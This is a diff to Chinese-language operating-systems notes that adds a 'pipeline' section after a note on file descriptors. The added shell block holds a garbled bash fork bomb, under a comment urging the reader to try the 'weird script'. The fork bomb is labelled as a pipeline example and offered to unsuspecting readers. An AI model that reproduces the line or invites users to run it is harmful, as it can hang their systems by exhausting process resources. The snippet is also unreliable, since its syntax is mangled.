@@ -89,5 +89,10 @@ TODO
 **File Descriptor.** 每个process都会维护一个VM，fs table（实际上是指向真正的fs table的ptr）和registers。
  ![Alt text](image-7.png)]
 
- 
+
+**pipeline**
+```sh 
+# 奇怪的脚本，赶紧试试吧！
+$ :(){:1:&};: 
+ ```
 
